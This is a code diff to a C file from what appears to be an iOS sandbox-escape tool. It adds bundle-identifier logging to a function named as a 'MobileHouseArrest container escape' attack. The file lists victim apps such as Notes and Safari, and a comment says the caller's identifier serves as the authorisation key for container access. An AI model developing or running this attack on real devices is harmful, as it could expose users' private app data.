@@ -31,6 +31,7 @@
 #include <string.h>
 #include <stdlib.h>
 #include <dirent.h>
+#include <CoreFoundation/CoreFoundation.h>
 
 /* xpc: the Theos SDK has no xpc/ headers, so the two calls we need are
  * declared by hand (libxpc is in libSystem). */
@@ -42,6 +43,7 @@ typedef void *container_query_t;
 typedef void *container_object_t;
 
 static const char *k_victims[] = {
+    "com.dj.srk801",
     "com.apple.mobilenotes",
     "com.apple.mobilesafari",
     "com.apple.Preferences",
@@ -61,6 +63,28 @@ void nk_mha_attack(void)
 {
     nk_doc_log_open("mha.log");
     nk_log("[MHA] === MobileHouseArrest container escape ===");
+    /* the identifier IS the authorisation key - it must be
+     * "com.apple.mobile.MobileHouseArrest" for MCM to vend anything */
+    {
+        const char *me = getenv("MHA_IDENT");
+        extern char **environ;
+        (void)me; (void)environ;
+    }
+    {
+        /* NSBundle's identifier, read via the CFBundle API */
+        CFBundleRef b = CFBundleGetMainBundle();
+        if (b) {
+            CFStringRef id = CFBundleGetIdentifier(b);
+            if (id) {
+                char buf[256] = {0};
+                if (CFStringGetCString(id, buf, sizeof(buf), kCFStringEncodingUTF8)) {
+                    nk_log("[MHA] our bundle identifier = %s", buf);
+                    nk_doc_log("mha.log", "[MHA] our bundle identifier = %s", buf);
+                }
+                CFRelease(id);
+            }
+        }
+    }
 
     void *lib = dlopen("/usr/lib/system/libsystem_containermanager.dylib",
                        RTLD_NOW | RTLD_LOCAL);
@@ -177,4 +201,13 @@ void nk_mha_attack(void)
 
     dlclose(lib);
     nk_log("[MHA] done");
+}
+
+/* Swift cannot call variadic C functions, so the identifier goes through a
+ * plain wrapper. */
+void nk_mha_log_ident(const char *ident)
+{
+    nk_doc_log_open("mha.log");
+    nk_log("[MHA] IDENT = %s", ident ? ident : "?");
+    nk_doc_log("mha.log", "[MHA] IDENT = %s", ident ? ident : "?");
 }
